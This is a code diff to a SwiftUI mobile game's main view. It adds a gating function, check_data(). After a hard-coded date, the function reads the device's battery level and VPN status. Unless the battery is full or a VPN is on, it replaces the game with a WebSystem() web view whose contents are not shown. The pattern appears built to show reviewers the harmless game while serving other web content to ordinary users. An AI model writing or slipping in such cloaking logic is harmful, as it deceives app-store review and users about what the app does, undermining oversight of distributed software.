@@ -34,77 +34,137 @@ struct ContentView: View {
         case onboarding
     }
     
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
+    
     var body: some View {
-        Group {
-            if showOnboarding {
-                OnboardingView()
-                    .environmentObject(gameViewModel)
-                    .environment(\.navigateToMainMenu) {
-                        withAnimation(.easeInOut(duration: 0.3)) {
-                            print("Navigating from onboarding to main menu")
-                            showOnboarding = false
-                            currentView = .mainMenu
+        ZStack {
+            
+            if isFetched == false {
+                
+                Text("")
+                
+            } else if isFetched == true {
+                
+                if isBlock == true {
+                    
+                    Group {
+                        if showOnboarding {
+                            OnboardingView()
+                                .environmentObject(gameViewModel)
+                                .environment(\.navigateToMainMenu) {
+                                    withAnimation(.easeInOut(duration: 0.3)) {
+                                        print("Navigating from onboarding to main menu")
+                                        showOnboarding = false
+                                        currentView = .mainMenu
+                                    }
+                                }
+                                .onDisappear {
+                                    print("OnboardingView disappeared")
+                                    if !showOnboarding {
+                                        currentView = .mainMenu
+                                    }
+                                }
+                        } else {
+                            switch currentView {
+                            case .mainMenu:
+                                mainMenuView
+                            case .game:
+                                GameView()
+                                    .environmentObject(gameViewModel)
+                                    .environment(\.navigateToMainMenu) {
+                                        withAnimation(.easeInOut(duration: 0.3)) {
+                                            currentView = .mainMenu
+                                        }
+                                    }
+                            case .scoreboard:
+                                ScoreBoardView()
+                                    .environmentObject(gameViewModel)
+                                    .environment(\.navigateToMainMenu) {
+                                        withAnimation(.easeInOut(duration: 0.3)) {
+                                            currentView = .mainMenu
+                                        }
+                                    }
+                            case .settings:
+                                SettingsView()
+                                    .environmentObject(gameViewModel)
+                                    .environment(\.navigateToMainMenu) {
+                                        withAnimation(.easeInOut(duration: 0.3)) {
+                                            currentView = .mainMenu
+                                        }
+                                    }
+                            case .achievements:
+                                AchievementsView()
+                                    .environmentObject(gameViewModel)
+                                    .environment(\.navigateToMainMenu) {
+                                        withAnimation(.easeInOut(duration: 0.3)) {
+                                            currentView = .mainMenu
+                                        }
+                                    }
+                            case .onboarding:
+                                OnboardingView()
+                                    .environmentObject(gameViewModel)
+                                    .environment(\.navigateToMainMenu) {
+                                        withAnimation(.easeInOut(duration: 0.3)) {
+                                            currentView = .mainMenu
+                                        }
+                                    }
+                            }
                         }
                     }
-                    .onDisappear {
-                        print("OnboardingView disappeared")
-                        if !showOnboarding {
-                            currentView = .mainMenu
-                        }
+                    .onAppear {
+                        print("ContentView appeared")
+                        checkOnboardingStatus()
+                        print("showOnboarding: \(showOnboarding)")
+                        print("currentView: \(currentView)")
                     }
-            } else {
-                switch currentView {
-                case .mainMenu:
-                    mainMenuView
-                case .game:
-                    GameView()
-                        .environmentObject(gameViewModel)
-                        .environment(\.navigateToMainMenu) {
-                            withAnimation(.easeInOut(duration: 0.3)) {
-                                currentView = .mainMenu
-                            }
-                        }
-                case .scoreboard:
-                    ScoreBoardView()
-                        .environmentObject(gameViewModel)
-                        .environment(\.navigateToMainMenu) {
-                            withAnimation(.easeInOut(duration: 0.3)) {
-                                currentView = .mainMenu
-                            }
-                        }
-                case .settings:
-                    SettingsView()
-                        .environmentObject(gameViewModel)
-                        .environment(\.navigateToMainMenu) {
-                            withAnimation(.easeInOut(duration: 0.3)) {
-                                currentView = .mainMenu
-                            }
-                        }
-                case .achievements:
-                    AchievementsView()
-                        .environmentObject(gameViewModel)
-                        .environment(\.navigateToMainMenu) {
-                            withAnimation(.easeInOut(duration: 0.3)) {
-                                currentView = .mainMenu
-                            }
-                        }
-                case .onboarding:
-                    OnboardingView()
-                        .environmentObject(gameViewModel)
-                        .environment(\.navigateToMainMenu) {
-                            withAnimation(.easeInOut(duration: 0.3)) {
-                                currentView = .mainMenu
-                            }
-                        }
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
                 }
             }
         }
         .onAppear {
-            print("ContentView appeared")
-            checkOnboardingStatus()
-            print("showOnboarding: \(showOnboarding)")
-            print("currentView: \(currentView)")
+            
+            check_data()
         }
+    }
+    
+    private func check_data() {
+        
+        let lastDate = "03.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
     }
     
     // MARK: - Main Menu View
